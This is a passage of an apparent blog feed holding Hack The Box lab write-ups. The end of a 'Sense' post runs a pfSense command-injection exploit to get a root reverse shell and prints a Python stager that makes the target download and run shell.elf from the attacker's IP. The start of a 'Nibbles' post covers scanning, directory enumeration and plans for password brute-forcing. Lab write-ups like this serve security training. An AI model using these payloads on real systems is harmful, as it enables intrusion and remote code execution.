<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">_  sense searchsploit -p <span style="color:#bd93f9">43560</span>
  Exploit: pfSense &lt; 2.1.4 - <span style="color:#f1fa8c">&#39;status_rrd_graph_img.php&#39;</span> Command Injection
      URL: https://www.exploit-db.com/exploits/43560
     Path: /opt/exploitdb/exploits/php/webapps/43560.py
File Type: Python script, ASCII text executable, with CRLF line terminators

Copied EDB-ID <span style="color:#6272a4">#43560&#39;s path to the clipboard</span>
_  sense python3 43560.py --rhost 10.10.10.60 --lhost 10.10.14.38 --lport <span style="color:#bd93f9">9000</span> --username rohit --password pfsense
CSRF token obtained
Running exploit...
Exploit completed
_  sense
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
_  sense nc -lnvp <span style="color:#bd93f9">9000</span>
Listening on 0.0.0.0 <span style="color:#bd93f9">9000</span>
Connection received on 172.19.0.1 <span style="color:#bd93f9">45020</span>
sh: can&#39;t access tty; job control turned off
<span style="color:#6272a4"># id</span>
<span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">(</span>root<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">gid</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">(</span>wheel<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">groups</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">(</span>wheel<span style="color:#ff79c6">)</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="exploitdb-39709">exploitdb 39709</h2>
<p>another exploit but needs rework</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">stager <span style="color:#ff79c6">=</span> (
<span style="color:#f1fa8c">&#39;echo </span><span style="color:#f1fa8c">\&#39;</span><span style="color:#f1fa8c">&lt;?php $shell =file_get_contents(&#34;http://10.10.14.38/shell.elf&#34;);&#39;</span> <span style="color:#ff79c6">+</span>
<span style="color:#f1fa8c">&#39;file_put_contents(&#34;myshell.elf&#34;, $shell);&#39;</span> <span style="color:#ff79c6">+</span>
<span style="color:#f1fa8c">&#39;system(&#34;chmod 755 myshell.elf &amp;&amp; ./myshell.elf&#34;); ?&gt; </span><span style="color:#f1fa8c">\&#39;</span><span style="color:#f1fa8c"> &gt; shellexec&#39;</span>
)
encoded_stager <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&#39;</span>
<span style="color:#ff79c6">for</span> c <span style="color:#ff79c6">in</span> stager:
  encoded_stager <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\\\\</span><span style="color:#f1fa8c">%03d</span><span style="color:#f1fa8c">&#34;</span> <span style="color:#ff79c6">%</span>(<span style="color:#8be9fd;font-style:italic">int</span>(<span style="color:#8be9fd;font-style:italic">oct</span>(<span style="color:#8be9fd;font-style:italic">ord</span>(c))))
<span style="color:#8be9fd;font-style:italic">print</span> (encoded_stager)
</code></pre></td></tr></table>
</div>
</div>]]></content></item><item><title>HTB - Nibbles</title><link>https://0xade1.github.io/posts/2020/09/htb-nibbles/</link><pubDate>Sat, 19 Sep 2020 00:54:12 +0800</pubDate><guid>https://0xade1.github.io/posts/2020/09/htb-nibbles/</guid><description>nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # Nmap 7.80 scan initiated Sat Sep 19 13:21:01 2020 as: nmap -sC -sV -oA nmap/nibbles -Pn 10.10.10.75 Nmap scan report for 10.10.10.75 Host is up (0.047s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 c4:f8:ad:e8:f8:04:77🇩🇪cf:15:0d:63:0a:18:7e:49 (RSA) | 256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA) |_ 256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519) 80/tcp open http Apache httpd 2.</description><content type="html"><![CDATA[<h1 id="nmap">nmap</h1>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#6272a4"># Nmap 7.80 scan initiated Sat Sep 19 13:21:01 2020 as: nmap -sC -sV -oA nmap/nibbles -Pn 10.10.10.75</span>
Nmap scan report <span style="color:#ff79c6">for</span> 10.10.10.75
Host is up <span style="color:#ff79c6">(</span>0.047s latency<span style="color:#ff79c6">)</span>.
Not shown: <span style="color:#bd93f9">998</span> closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 <span style="color:#ff79c6">(</span>Ubuntu Linux; protocol 2.0<span style="color:#ff79c6">)</span>
| ssh-hostkey:
|   <span style="color:#bd93f9">2048</span> c4:f8:ad:e8:f8:04:77🇩🇪cf:15:0d:63:0a:18:7e:49 <span style="color:#ff79c6">(</span>RSA<span style="color:#ff79c6">)</span>
|   <span style="color:#bd93f9">256</span> 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 <span style="color:#ff79c6">(</span>ECDSA<span style="color:#ff79c6">)</span>
|_  <span style="color:#bd93f9">256</span> e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 <span style="color:#ff79c6">(</span>ED25519<span style="color:#ff79c6">)</span>
80/tcp open  http    Apache httpd 2.4.18 <span style="color:#ff79c6">((</span>Ubuntu<span style="color:#ff79c6">))</span>
|_http-server-header: Apache/2.4.18 <span style="color:#ff79c6">(</span>Ubuntu<span style="color:#ff79c6">)</span>
|_http-title: Site doesn&#39;t have a title <span style="color:#ff79c6">(</span>text/html<span style="color:#ff79c6">)</span>.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
<span style="color:#6272a4"># Nmap done at Sat Sep 19 13:21:11 2020 -- 1 IP address (1 host up) scanned in 9.58 seconds</span>
</code></pre></td></tr></table>
</div>
</div><h1 id="gobuster">gobuster</h1>
<p>Nothing sweet with gobuster</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ctf@014202efa8c8:~/htb/nibbles$ gobuster dir -u http://10.10.10.75 -w /opt/dictionaries/common.txt -o gobuster.log
/.hta <span style="color:#ff79c6">(</span>Status: 403<span style="color:#ff79c6">)</span>
/.htaccess <span style="color:#ff79c6">(</span>Status: 403<span style="color:#ff79c6">)</span>
/.htpasswd <span style="color:#ff79c6">(</span>Status: 403<span style="color:#ff79c6">)</span>
/index.html <span style="color:#ff79c6">(</span>Status: 200<span style="color:#ff79c6">)</span>
/server-status <span style="color:#ff79c6">(</span>Status: 403<span style="color:#ff79c6">)</span>
</code></pre></td></tr></table>
</div>
</div><p>But index.html contains interesting comments</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ctf@014202efa8c8:~/htb/nibbles$ curl -s http://10.10.10.75/index.html
&lt;b&gt;Hello world!&lt;/b&gt;
...
&lt;!-- /nibbleblog/ directory. Nothing interesting here! --&gt;
</code></pre></td></tr></table>
</div>
</div><p>Not a wordpress blog</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">&gt;wpscan --url http://10.10.10.75/nibbleblog/ -e u,p
...
Scan Aborted: The remote website is up, but does not seem to be running WordPress.
</code></pre></td></tr></table>
</div>
</div><p>A bit more gobuster</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ctf@014202efa8c8:~/htb/nibbles$ gobuster dir -t <span style="color:#bd93f9">40</span> -u http://10.10.10.75/nibbleblog -w /opt/dictionaries/common.txt -o gobuster.log
...
/README <span style="color:#ff79c6">(</span>Status: 200<span style="color:#ff79c6">)</span>
/admin.php <span style="color:#ff79c6">(</span>Status: 200<span style="color:#ff79c6">)</span>
/index.php <span style="color:#ff79c6">(</span>Status: 200<span style="color:#ff79c6">)</span>
</code></pre></td></tr></table>
</div>
</div><p>We find few version information</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#ff79c6">======</span> <span style="color:#8be9fd;font-style:italic">Nibbleblog</span> <span style="color:#ff79c6">======</span>
Version: v4.0.3
<span style="color:#ff79c6">[</span>...<span style="color:#ff79c6">]</span>
<span style="color:#ff79c6">=====</span> System <span style="color:#8be9fd;font-style:italic">Requirements</span> <span style="color:#ff79c6">=====</span>
* PHP v5.2 or <span style="color:#8be9fd;font-style:italic">higher</span>
<span style="color:#ff79c6">=====</span> Installation <span style="color:#8be9fd;font-style:italic">guide</span> <span style="color:#ff79c6">=====</span>
1- Download the last version from http://nibbleblog.com
</code></pre></td></tr></table>
</div>
</div><p>Searchsploit</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ctf@014202efa8c8:~/htb/nibbles$ searchsploit nibble
-------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                            |  Path
-------------------------------------------------------------------------- ---------------------------------
Nibbleblog <span style="color:#bd93f9">3</span> - Multiple SQL Injections                                    | php/webapps/35865.txt
Nibbleblog 4.0.3 - Arbitrary File Upload <span style="color:#ff79c6">(</span>Metasploit<span style="color:#ff79c6">)</span>                     | php/remote/38489.rb
-------------------------------------------------------------------------- ---------------------------------
</code></pre></td></tr></table>
</div>
</div><p>There is a metasploit exploit, but it requires user and password :/</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">docker run --rm -it -v <span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">${</span><span style="color:#8be9fd;font-style:italic">HOME</span><span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">/.msf:/home/msf/&#34;</span> -p 4444:4444 -p 1337:1337 -p <span style="color:#8be9fd;font-style:italic">$1</span>:<span style="color:#8be9fd;font-style:italic">$1</span> metasploitframework/metasploit-framework ./msfconsole
msf6 &gt; search nibble
msf6 exploit<span style="color:#ff79c6">(</span>multi/http/nibbleblog_file_upload<span style="color:#ff79c6">)</span> &gt; info
</code></pre></td></tr></table>
</div>
</div><p>Let&rsquo;s download and explore nibbleblog: the file is in sourceforge so we need to follow redirection with <code>curl -L</code></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ctf@014202efa8c8:~/htb/nibbles$ curl -s -L -o nibbleblog-v4.0.3.zip  https://sourceforge.net/projects/nibbleblog/files/v4.0/nibbleblog-v4.0.3.zip/download
ctf@014202efa8c8:~/htb/nibbles$ file nibbleblog-v4.0.3.zip
nibbleblog-v4.0.3.zip: Zip archive data, at least v1.0 to extract
ctf@014202efa8c8:~/htb/nibbles$ unzip nibbleblog-v4.0.3.zip
ctf@014202efa8c8:~/htb/nibbles$ <span style="color:#8be9fd;font-style:italic">cd</span> nibbleblog
ctf@014202efa8c8:~/htb/nibbles/nibbleblog$ unzip nibbleblog-v4.0.3.zip
</code></pre></td></tr></table>
</div>
</div><p>according to install.php there is few xml files /content/private/users.xml we can visualize to figure out the username</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ctf@014202efa8c8:~/htb/nibbles/nibbleblog$ curl -s http://10.10.10.75/nibbleblog/content/private/users.xml
&lt;?xml <span style="color:#8be9fd;font-style:italic">version</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;1.0&#34;</span> <span style="color:#8be9fd;font-style:italic">encoding</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;UTF-8&#34;</span> <span style="color:#8be9fd;font-style:italic">standalone</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;yes&#34;</span>?&gt;
&lt;users&gt;&lt;user <span style="color:#8be9fd;font-style:italic">username</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;admin&#34;</span>&gt; ...
</code></pre></td></tr></table>
</div>
</div><p>However passowrd is stored in a php file and can&rsquo;t be retrieved</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">        <span style="color:#6272a4">// shadow.php
</span><span style="color:#6272a4"></span>        <span style="color:#8be9fd;font-style:italic">$new_salt</span> <span style="color:#ff79c6">=</span> Text<span style="color:#ff79c6">::</span><span style="color:#50fa7b">random_text</span>(<span style="color:#bd93f9">11</span>);
        <span style="color:#8be9fd;font-style:italic">$new_hash</span> <span style="color:#ff79c6">=</span> Crypt<span style="color:#ff79c6">::</span><span style="color:#50fa7b">get_hash</span>(<span style="color:#8be9fd;font-style:italic">$_POST</span>[<span style="color:#f1fa8c">&#39;password&#39;</span>],<span style="color:#8be9fd;font-style:italic">$new_salt</span>);
        <span style="color:#8be9fd;font-style:italic">$text</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&lt;?php $_USER[0][&#34;uid&#34;] = &#34;0&#34;; $_USER[0][&#34;username&#34;] = &#34;&#39;</span><span style="color:#ff79c6">.</span><span style="color:#8be9fd;font-style:italic">$_POST</span>[<span style="color:#f1fa8c">&#39;username&#39;</span>]<span style="color:#ff79c6">.</span><span style="color:#f1fa8c">&#39;&#34;; $_USER[0][&#34;password&#34;] = &#34;&#39;</span><span style="color:#ff79c6">.</span><span style="color:#8be9fd;font-style:italic">$new_hash</span><span style="color:#ff79c6">.</span><span style="color:#f1fa8c">&#39;&#34;; $_USER[0][&#34;salt&#34;] = &#34;&#39;</span><span style="color:#ff79c6">.</span><span style="color:#8be9fd;font-style:italic">$new_salt</span><span style="color:#ff79c6">.</span><span style="color:#f1fa8c">&#39;&#34;; $_USER[0][&#34;email&#34;] = &#34;&#39;</span><span style="color:#ff79c6">.</span><span style="color:#8be9fd;font-style:italic">$_POST</span>[<span style="color:#f1fa8c">&#39;email&#39;</span>]<span style="color:#ff79c6">.</span><span style="color:#f1fa8c">&#39;&#34;; ?&gt;&#39;</span>;
        <span style="color:#8be9fd;font-style:italic">$file</span> <span style="color:#ff79c6">=</span> fopen(FILE_SHADOW, <span style="color:#f1fa8c">&#39;w&#39;</span>);
        fputs(<span style="color:#8be9fd;font-style:italic">$file</span>, <span style="color:#8be9fd;font-style:italic">$text</span>);
        fclose(<span style="color:#8be9fd;font-style:italic">$file</span>);
</code></pre></td></tr></table>
</div>
</div><p>We can do a bruteforce with common passwords admin:admin|root|nibbles|nibbleblog &hellip;</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
